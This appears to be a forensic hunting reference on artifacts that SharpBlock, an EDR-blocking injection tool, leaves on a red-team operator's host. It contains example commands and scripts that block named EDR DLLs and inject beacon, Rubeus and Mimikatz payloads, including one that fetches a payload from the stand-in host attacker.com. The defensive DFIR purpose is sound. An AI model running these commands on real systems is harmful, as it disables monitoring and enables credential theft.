# SharpBlock — Source Evidence

**Where to look on the attacker/red-team source host for SharpBlock usage evidence.**

This section covers evidence on the host *where SharpBlock was staged and executed*, not the target host where the payload was injected.

---

## File Presence

### SharpBlock.exe itself
| Location | Likelihood | Persistence | Notes |
|---|---|---|---|
| Cobalt Strike staging directory (default: `~/.cobaltstrike/`) | High (if integrated with CS) | None (may be deleted) | Default staging location in Cobalt Strike operations. |
| Red-team toolkit directory (e.g., `C:\Tools\`, `C:\Red-Team\`) | High | None (may be deleted) | Common on red-team infrastructure. |
| Attacker's compilation directory | Medium (if compiled from source) | None (deleted post-use) | Source repo cloned; compiled locally; binary moved to staging. |
| VCS (git) clone of CCob/SharpBlock repo | Medium | None if cloned to staging dir | Evidence of repo clone on attacker's machine. |
| Build artifact / CI/CD pipeline | Low (not typically) | None | Unlikely unless attacker uses automated build systems. |

---

## Process Execution & Command-Line Evidence

### Process Tree on Red-Team Host
```
cmd.exe or powershell.exe
  └─ SharpBlock.exe <args>
```

**Expected command-line examples:**
```
SharpBlock.exe -s cmd.exe -e beacon.exe -a "/c echo test" -n csagent.dll
SharpBlock.exe --exe http://attacker.com/payload.exe -d "Falcon" -s notepad.exe
SharpBlock.exe -e \\.\pipe\shellcode --ppid 1024 -n amsi.dll
```

### Event Log Artifacts
If the red-team operator's own host is monitored:

- **Windows Event Log: Security (Event ID 4688 - Process Creation)**
  - Process name: `SharpBlock.exe`
  - Command line: contains target EDR DLL name, host executable, payload path/URL.
  - Parent process: typically `cmd.exe` or `powershell.exe`.
  - **Huntable pattern:** `CommandLine CONTAINS "SharpBlock"` (if red-team operator's host is monitored).

- **Windows Event Log: System**
  - If SharpBlock crashes or throws an exception, error logs may appear.

---

## Compilation & Build Artifacts

If the red-team operator compiled SharpBlock from source on their own machine:

### Visual Studio / Compiler Artifacts
- **Solution/project files:**
  ```
  SharpBlock.sln
  SharpBlock.csproj
  ```
- **Source code files:**
  ```
  Program.cs
  Context.cs, Context32.cs, Context64.cs
  ContextFactory.cs
  ```
- **Build output directories:**
  ```
  bin\Release\ (compiled binaries)
  bin\Debug\ (debug symbols)
  obj\ (intermediate compilation artifacts)
  ```

**Locations:**
```
C:\Users\<operator>\Desktop\SharpBlock\
C:\Users\<operator>\Downloads\SharpBlock\
C:\Dev\SharpBlock\
/home/<operator>/src/SharpBlock/
```

### Compiler/Build Tool Artifacts
- **`.pdb` files** (debug symbols): If compiled in Debug mode, `.pdb` files retain symbol information (source file paths, function names, variable names). Forensic recovery of `.pdb` can expose operator's directory structure and build environment.
- **Intermediate files**: `.cs` source files (if not deleted) show the tool's source code and any customizations.

---

## Version Control (Git) Evidence

If the red-team operator cloned the official repo from GitHub:

### `.git` Directory Structure
```
.git/
  objects/        (commit objects, blobs)
  refs/           (branch references)
  HEAD            (current branch pointer)
  config          (repository configuration, including clone URL)
  reflog          (reflog: history of branch/commit changes)
  packed-refs     (compressed refs)
```

**Forensic Value:**
- `config` file contains the clone URL: `url = https://github.com/CCob/SharpBlock.git`
- `reflog` contains timestamps of when the repo was accessed/cloned.
- Commit history (`git log`) shows when and by whom modifications were made (if any).

**Locations:**
```
C:\Users\<operator>\Downloads\SharpBlock\.git\
/home/<operator>/src/SharpBlock/.git/
```

---

## Payload Files

If the red-team operator staged payloads locally before transferring to target:

### Beacon/Payload Binaries
- **Cobalt Strike beacons**: `beacon.exe`, `beacon_x64.exe`, `beacon_x86.exe` (various artifacts).
- **Shellcode files**: `.bin`, `.raw` (raw shellcode bytes).
- **Tool payloads**: `rubeus.exe`, `mimikatz.exe` (credential theft tools).

**Locations:**
```
C:\Tools\payloads\
C:\Users\<operator>\Desktop\artifacts\
/home/<operator>/cs_payloads/
```

**Forensic Artifacts:**
- File timestamps (creation, modification) reveal when payloads were compiled/staged.
- Hash analysis (MD5, SHA256) can correlate payloads across multiple red-team operations.
- Strings extraction may reveal hardcoded C2 domains, encryption keys, or identifiable metadata.

---

## Automation & Script Evidence

If the red-team operator created scripts to automate SharpBlock usage:

### Batch / PowerShell Scripts
```batch
@echo off
REM automated_injection.bat
SharpBlock.exe -s cmd.exe -e C:\Payloads\beacon.exe -n csagent.dll -a "/c powershell.exe"
SharpBlock.exe -s notepad.exe -e C:\Payloads\rubeus.exe -n csagent.dll
```

```powershell
# automated_injection.ps1
$edr_dll = "csagent.dll"
$payloads = @("beacon.exe", "rubeus.exe", "mimikatz.exe")
foreach ($payload in $payloads) {
    & "C:\Tools\SharpBlock.exe" -s "cmd.exe" -e "C:\Payloads\$payload" -n $edr_dll -a "/c calc.exe"
}
```

**Locations:**
```
C:\Tools\inject_all.bat
C:\Users\<operator>\Desktop\deploy.ps1
/home/<operator>/red-team/automation/inject.sh
```

**Forensic Value:**
- Shows the operator's workflow and which EDR DLLs they targeted.
- Reveals all payloads used in the campaign.
- Timestamps show when automation scripts were created/modified.

---

## Cobalt Strike Integration Evidence

If the red-team operator integrated SharpBlock with Cobalt Strike:

### Cobalt Strike Aggressor Scripts
```
%USERPROFILE%\.cobaltstrike\aggressor.sh or scripts\
```

Aggressor scripts might contain SharpBlock wrapper:
```aggressor
sub inject_via_sharpblock {
    local("$pid $process");
    $pid = arg(0);
    println("[*] Injecting via SharpBlock...");
    system("C:\\Tools\\SharpBlock.exe -e beacon.exe -s cmd.exe -n csagent.dll");
}
```

### Cobalt Strike Logs
- **Aggressor script logs**: If logging is enabled, Cobalt Strike logs all script invocations, including SharpBlock wrapper calls.
- **Team server logs**: If centralized, the team server may log all payloads generated and deployment methods used.

**Locations:**
```
~/.cobaltstrike/logs/
~/.cobaltstrike/callbacks.log (if configured)
```

---

## Network Evidence (Limited)

SharpBlock itself does **not** perform network communication on the red-team host. However, evidence of preparation may exist:

### HTTP Beacon Fetching Logs (If Red-Team Host Staged Payloads from Remote Server)
If the red-team operator fetched a beacon from a remote server before transferring to target:
- **Browser history**: HTTP GET requests to attacker infrastructure.
- **Firewall/proxy logs**: Outbound HTTP requests to payload hosting server.

**Example:**
```
2024-01-15 14:00:00 — HTTP GET http://attacker-server.local/beacon.exe (200 OK)
```

---

## Reverse Engineering & Analysis Tools

If the red-team operator used debugging/analysis tools to test or reverse-engineer SharpBlock:

### Disassembly / Debugging Tools
- **IDA Pro, Ghidra**: If used to analyze SharpBlock or payloads locally.
- **WinDbg, x64dbg**: If used to debug SharpBlock execution in a lab environment.
- **dnSpy, ILSpy**: .NET decompilers (SharpBlock is C# and can be decompiled).

**Evidence:**
- Temporary files in `C:\temp\` or `%TEMP%` from debugger sessions.
- IDA database files (`.idb`, `.i64`) from reverse engineering.
- Debugger window screenshots in operator's files (if present).

---

## Memory Artifacts

If forensic memory capture is performed on the red-team operator's machine during SharpBlock usage:

### Process Memory
- **SharpBlock.exe process memory**: Contains loaded .NET runtime, loaded DLLs, command-line arguments.
- **Parent process memory** (e.g., cmd.exe): Contains command history, launched command lines.

**Forensic Recovery (using Volatility, WinPmem, etc.):**
```
volatility -f memory.dmp windows.pslist | grep SharpBlock
volatility -f memory.dmp windows.cmdline | grep SharpBlock
```

**Expected Output:**
```
PID: 4560
Process: SharpBlock.exe
Command: SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll
```

---

## Third-Party Security Tools Logs

If the red-team operator's own host runs antivirus or EDR:

### Antivirus/EDR Alerts
- **Antivirus flags SharpBlock itself**: Some antivirus vendors may flag SharpBlock as a PUA (Potentially Unwanted Application) or hacking tool.
- **Process injection detection**: EDR on the red-team host may flag SharpBlock's injection activity (if the red-team host's EDR is enabled).

**Expected Alerts (if AV/EDR is running on red-team host):**
```
Alert: Suspicious Process Injection Detected
Process: SharpBlock.exe
Target: cmd.exe
Signature: HackTool:Win32/SharpBlock.A or similar
Timestamp: 2024-01-15 14:00:00
```

**Note:** Most red-team operators disable EDR/antivirus on their own infrastructure, so this evidence is unlikely unless the operator's machine is monitored without their knowledge.

---

## Summary: Most Reliable Source Evidence

| Artifact | Reliability | Persistence | Forensic Value |
|---|---|---|---|
| **Event Log 4688 (Process Creation)** | High | Until log rotation | Exact command line, timestamp, arguments. |
| **SharpBlock.exe binary on disk** | High | Until deletion | File hash, timestamps, metadata. |
| **Payload binaries staged locally** | High | Until deletion | File hashes, timestamps, correlation with target artifacts. |
| **Git repository clones** | High | Until deletion | Commit history, clone timestamp, repository URL. |
| **Compilation artifacts (.pdb, .obj)** | Medium | Until cleanup | Operator's directory structure, build environment. |
| **Batch/PowerShell automation scripts** | High | Until deletion | Shows workflow, EDR targets, payloads used. |
| **Cobalt Strike Aggressor scripts** | Medium | Until deletion | SharpBlock integration with C2 framework. |
| **Memory capture** | Medium | Only during capture | Process memory, command-line arguments in memory. |
| **AV/EDR alerts (if enabled)** | Low | Varies | If red-team host's own security caught the activity. |

---

## Key Indicators for Hunters

**If you suspect SharpBlock usage on a red-team source host, look for:**
1. **Binary file**: `SharpBlock.exe` in Tools, Downloads, Desktop, or project directories.
2. **Command-line evidence**: Event Log 4688 with `SharpBlock` in the command line, arguments referencing EDR DLL names (e.g., `csagent.dll`, `falcon.dll`).
3. **Payload binaries**: Beacon files, Rubeus, Mimikatz, etc., in the same directory as SharpBlock.
4. **Git clone**: `.git` directory indicating a clone from github.com/CCob/SharpBlock.
5. **Automation scripts**: Batch/PowerShell scripts containing SharpBlock invocations in loops or with payloads.
6. **Timestamps correlating**: SharpBlock execution timestamp matches with payload staging and transfer to target.

---

## Post-Incident Cleanup by Attacker

A sophisticated red-team operator will:
1. Delete SharpBlock.exe from the source host.
2. Delete payload binaries.
3. Clear Event Logs or event log forwarding (if possible).
4. Delete git repositories and build artifacts.
5. Clear browser history and temporary files.

**However**, forensic recovery may still reveal:
- Deleted files in unallocated sectors (via forensic carving).
- $MFT records of deleted files (showing filenames and timestamps).
- Registry keys (if modified, timestamps may remain).
- Backup/shadow copies (Volume Shadow Copy Service).
- Memory dumps (if captured before cleanup).

---

## Cross-Link to Target Evidence

Once SharpBlock is identified on the source host, correlate with target evidence:
- **Target process injection**: Event Log 4688 on target showing suspension and injection patterns.
- **EDR DLL blocking**: The specific EDR DLL mentioned in SharpBlock command line should correlate with a blocked/modified DLL on the target.
- **C2 callback**: Timeline of beacon callback on target should align with SharpBlock execution on source host.
